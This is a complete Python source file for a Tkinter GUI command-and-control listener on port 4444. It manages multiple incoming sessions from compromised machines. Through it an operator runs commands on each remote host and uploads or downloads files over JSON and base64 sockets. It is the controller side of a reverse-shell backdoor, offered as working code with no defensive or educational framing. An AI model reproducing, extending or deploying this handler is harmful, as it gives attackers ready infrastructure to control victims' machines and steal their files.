import base64
import json
import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, ttk


class Session:
    def __init__(self, connection, address):
        self.connection = connection
        self.address = address
        self.closed = False

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send((json_data + "\n").encode())

    def reliable_receive(self):
        json_data = ""
        while "\n" not in json_data:
            chunk = self.connection.recv(1024).decode()
            if not chunk:
                raise ConnectionError("Client disconnected")
            json_data += chunk
        return json.loads(json_data.rstrip("\n"))

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(content)
        return f"Saved file to {path}"

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.close()
            return "Session ended."
        return self.reliable_receive()

    def close(self):
        if not self.closed:
            self.closed = True
            try:
                self.connection.close()
            except OSError:
                pass


class ListenerServer:
    def __init__(self, host, port, on_connection):
        self.host = host
        self.port = port
        self.on_connection = on_connection
        self._running = False
        self.listener = None
        self._thread = None

    def _setup_server(self):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.host, self.port))
        self.listener.listen(5)

    def start(self):
        self._setup_server()
        self._running = True
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _accept_loop(self):
        while self._running:
            try:
                conn, addr = self.listener.accept()
                self.on_connection(conn, addr)
            except OSError:
                break

    def stop(self):
        self._running = False
        if self.listener:
            try:
                self.listener.close()
            except OSError:
                pass


class ListenTab(tk.Frame):
    def __init__(self, parent, host, port):
        super().__init__(parent)
        tk.Label(
            self,
            text=f"Waiting for connection on {host}:{port}",
            font=("", 12),
        ).pack(expand=True)


class SessionTab(tk.Frame):
    def __init__(self, parent, session, app, on_close):
        super().__init__(parent)
        self.session = session
        self.app = app
        self.on_close = on_close
        self._busy = False

        addr = f"{session.address[0]}:{session.address[1]}"
        header = tk.Frame(self)
        header.pack(fill="x", padx=10, pady=5)
        tk.Label(header, text=f"Connected: {addr}", font=("", 11, "bold")).pack(side="left")
        tk.Button(header, text="Close tab", command=self._close_tab).pack(side="right")

        self.output = scrolledtext.ScrolledText(self, height=20, state="disabled")
        self.output.pack(fill="both", expand=True, padx=10, pady=5)

        cmd_frame = tk.Frame(self)
        cmd_frame.pack(fill="x", padx=10, pady=5)
        self.cmd_entry = tk.Entry(cmd_frame)
        self.cmd_entry.pack(side="left", fill="x", expand=True)
        self.cmd_entry.bind("<Return>", lambda _: self._send_command())
        tk.Button(cmd_frame, text="Send", command=self._send_command).pack(side="right", padx=(5, 0))

        self._append_output(f"Connection established from {addr}")

    def _append_output(self, text):
        self.output.configure(state="normal")
        self.output.insert(tk.END, text + "\n")
        self.output.see(tk.END)
        self.output.configure(state="disabled")

    def _set_busy(self, busy):
        self._busy = busy
        if not self.session.closed:
            self.cmd_entry.configure(state="disabled" if busy else "normal")

    def _send_command(self):
        if self._busy or self.session.closed:
            return
        raw = self.cmd_entry.get().strip()
        if not raw:
            return
        self.cmd_entry.delete(0, tk.END)
        command = raw.split(" ")

        self._set_busy(True)
        self._append_output(f"> {raw}")
        threading.Thread(target=self._run_command, args=(command,), daemon=True).start()

    def _run_command(self, command):
        try:
            if command[0] == "upload" and len(command) > 1:
                file_content = Session.read_file(command[1])
                command = list(command)
                command.append(file_content)

            result = self.session.execute_remotely(command)

            if command[0] == "download" and isinstance(result, str) and "Error:" not in result:
                result = Session.write_file(command[1], base64.b64decode(result))

            self.app.root.after(
                0,
                lambda r=result, ended=(command[0] == "exit"): self._on_command_done(r, ended),
            )
        except (ConnectionResetError, BrokenPipeError, ConnectionError, OSError) as exc:
            self.app.root.after(0, lambda msg=str(exc): self._on_disconnect(msg))
        except Exception as exc:
            self.app.root.after(0, lambda msg=f"Error: {exc}": self._on_command_done(msg, False))

    def _on_command_done(self, result, session_ended):
        self._append_output(str(result))
        if session_ended or self.session.closed:
            self._on_disconnect("Session ended.")
        else:
            self._set_busy(False)

    def _on_disconnect(self, message):
        self.session.close()
        self._append_output(message)
        self.cmd_entry.configure(state="disabled")

    def _close_tab(self):
        self.session.close()
        self.on_close(self)


class ListenerApp:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.root = tk.Tk()
        self.root.title(f"Listener — {host}:{port}")
        self.root.geometry("700x500")
        self.root.minsize(500, 350)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=5, pady=5)

        self._listen_tabs = []
        self._sessions = []
        self._lock = threading.Lock()

        self.server = ListenerServer(host, port, self._on_connection)
        self.root.protocol("WM_DELETE_WINDOW", self._shutdown)

        self._add_listen_tab()
        self.server.start()

    def _add_listen_tab(self):
        frame = ListenTab(self.notebook, self.host, self.port)
        self.notebook.add(frame, text="Listening...")
        self._listen_tabs.append(frame)
        self.notebook.select(frame)
        return frame

    def _on_connection(self, conn, addr):
        self.root.after(0, lambda c=conn, a=addr: self._handle_connection(c, a))

    def _handle_connection(self, conn, addr):
        with self._lock:
            if self._listen_tabs:
                listen_tab = self._listen_tabs.pop(0)
            else:
                listen_tab = self._add_listen_tab()
                self._listen_tabs.pop()

            self.notebook.forget(listen_tab)
            listen_tab.destroy()

            session = Session(conn, addr)
            self._sessions.append(session)

            session_frame = SessionTab(
                self.notebook,
                session,
                self,
                on_close=self._remove_session_tab,
            )
            self.notebook.add(session_frame, text=f"Session: {addr[0]}:{addr[1]}")
            self.notebook.select(session_frame)

            self._add_listen_tab()

    def _remove_session_tab(self, session_frame):
        with self._lock:
            session_frame.session.close()
            if session_frame.session in self._sessions:
                self._sessions.remove(session_frame.session)
            try:
                self.notebook.forget(session_frame)
            except tk.TclError:
                pass
            session_frame.destroy()

    def _shutdown(self):
        self.server.stop()
        with self._lock:
            for session in self._sessions:
                session.close()
            self._sessions.clear()
        self.root.destroy()

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    app = ListenerApp("0.0.0.0", 4444)
    app.run()
